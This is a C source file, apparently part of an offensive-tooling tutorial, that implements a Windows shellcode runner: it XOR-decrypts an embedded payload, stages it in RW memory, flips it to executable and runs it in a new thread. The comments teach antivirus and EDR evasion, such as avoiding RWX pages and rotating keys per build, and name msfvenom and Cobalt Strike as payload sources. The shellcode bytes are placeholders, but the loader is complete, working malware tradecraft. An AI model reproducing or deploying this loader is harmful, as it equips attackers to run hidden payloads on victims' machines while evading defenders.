/*
 * 01_xor_shellcode_runner.c
 * ========================
 * Shellcode Runner with XOR Encryption
 *
 * Idea: the shellcode is stored encrypted in the binary. At execution time,
 * it is decrypted in memory and executed. This prevents the AV from
 * detecting the shellcode during static analysis (when it inspects the file on disk).
 *
 * XOR is the simplest operation: A ^ B = C, and C ^ B = A back.
 * The same function works for both encryption and decryption.
 *
 * WARNING: XOR alone is weak. Modern EDRs easily detect
 * XOR patterns (obvious loops, large buffers). Use combined
 * with other techniques (random key per build, delay, syscalls).
 *
 * Compile: cl.exe /O2 01_xor_shellcode_runner.c
 */

#include <windows.h>
#include <stdio.h>

/* ---------------------------------------------------------------
 * xorCrypt - Applies XOR byte by byte on the buffer using the key.
 *
 * Parameters:
 *   buffer  -> pointer to the byte array (shellcode)
 *   bufLen  -> buffer size in bytes
 *   key     -> key string (e.g.: "MyKey123")
 *   keyLen  -> key length
 *
 * The ^ (XOR) operator compares bit by bit:
 *   0 ^ 0 = 0
 *   1 ^ 0 = 1
 *   0 ^ 1 = 1
 *   1 ^ 1 = 0
 *
 * The trick is that XOR is reversible: if you apply it twice
 * with the same key, you get back to the original value.
 * --------------------------------------------------------------- */
void xorCrypt(unsigned char* buffer, size_t bufLen, const char* key, size_t keyLen) {
    for (size_t i = 0; i < bufLen; i++) {
        /*
         * key[i % keyLen] -> uses the key cyclically.
         * If the key has 5 bytes and the buffer has 100, the key
         * repeats: 0,1,2,3,4,0,1,2,3,4,0,1,...
         *
         * buffer[i] ^= key[...] -> XOR in-place, modifies the byte directly
         */
        buffer[i] ^= key[i % keyLen];
    }
}

int main() {

    /*
     * EXAMPLE SHELLCODE (placeholder)
     * In a real scenario, the shellcode would already be XOR-ENCRYPTED here.
     * You would generate it like this:
     *   1. Generate shellcode with msfvenom or Cobalt Strike
     *   2. Encrypt it with the same xorCrypt function
     *   3. Paste the result here (already encrypted)
     *
     * This example uses dummy bytes just to demonstrate the flow.
     */
    unsigned char encrypted_shellcode[] = {
        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11, 0x22,
        0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x00
    };

    size_t shellcode_size = sizeof(encrypted_shellcode);

    /* Encryption key - change it each build to hinder detection */
    const char key[] = "R4nd0m_K3y_2025!";
    size_t key_size = sizeof(key) - 1; /* -1 to ignore the trailing \0 */

    printf("[*] Encrypted shellcode (%zu bytes)\n", shellcode_size);

    /* ---------------------------------------------------------------
     * STEP 1: Allocate memory with read and write permission (RW)
     *
     * VirtualAlloc reserves a block of virtual memory.
     * Parameters:
     *   NULL           -> let Windows choose the address
     *   size           -> how many bytes to allocate
     *   MEM_COMMIT | MEM_RESERVE -> reserve AND commit the memory
     *   PAGE_READWRITE -> permission: can read and write (but NOT execute)
     *
     * Why not allocate directly as RWX (read+write+execute)?
     * Because RWX memory is a HUGE red flag for EDRs. We allocate RW first,
     * copy the shellcode, and then change to RX (read+execute).
     * --------------------------------------------------------------- */
    void* memory = VirtualAlloc(
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE  /* RW - read and write only for now */
    );

    if (memory == NULL) {
        printf("[!] Failed to allocate memory. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Memory allocated at: 0x%p\n", memory);

    /* ---------------------------------------------------------------
     * STEP 2: Decrypt the shellcode
     *
     * Apply XOR again with the same key.
     * Since XOR is symmetric: encrypted ^ key = original
     * --------------------------------------------------------------- */
    xorCrypt(encrypted_shellcode, shellcode_size, key, key_size);
    printf("[+] Shellcode decrypted in memory\n");

    /* ---------------------------------------------------------------
     * STEP 3: Copy decrypted shellcode to allocated memory
     *
     * memcpy copies N bytes from one place to another.
     * Now the clean shellcode is in the region we allocated.
     * --------------------------------------------------------------- */
    memcpy(memory, encrypted_shellcode, shellcode_size);

    /* ---------------------------------------------------------------
     * STEP 4: Change memory permission to RX (Read + Execute)
     *
     * VirtualProtect changes the permissions of a memory region.
     * Parameters:
     *   memory           -> region address
     *   shellcode_size   -> region size
     *   PAGE_EXECUTE_READ -> new permission: can read and execute
     *   &old_permission  -> saves the previous permission here
     *
     * Now the memory can be EXECUTED but no longer written to.
     * This is more discreet than having RWX the whole time.
     * --------------------------------------------------------------- */
    DWORD old_permission;
    VirtualProtect(memory, shellcode_size, PAGE_EXECUTE_READ, &old_permission);
    printf("[+] Permission changed to RX (Execute + Read)\n");

    /* ---------------------------------------------------------------
     * STEP 5: Execute the shellcode
     *
     * We create a thread that points to the beginning of our memory.
     * CreateThread creates a new thread in the current process.
     *
     * The cast (LPTHREAD_START_ROUTINE) tells the compiler:
     * "treat this memory address as if it were a function"
     *
     * The thread will start executing the bytes at that
     * address - which are our decrypted shellcode.
     *
     * WaitForSingleObject waits for the thread to finish before exiting.
     * INFINITE = wait forever (until the shellcode completes).
     * --------------------------------------------------------------- */
    HANDLE hThread = CreateThread(
        NULL,                              /* no security attributes */
        0,                                 /* default stack size */
        (LPTHREAD_START_ROUTINE)memory,    /* function = our shellcode */
        NULL,                              /* no parameters */
        0,                                 /* execute immediately */
        NULL                               /* don't need the thread ID */
    );

    if (hThread == NULL) {
        printf("[!] Failed to create thread. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Thread created. Executing shellcode...\n");
    WaitForSingleObject(hThread, INFINITE);

    /* Cleanup - good OPSEC practice */
    CloseHandle(hThread);
    VirtualFree(memory, 0, MEM_RELEASE);

    return 0;
}
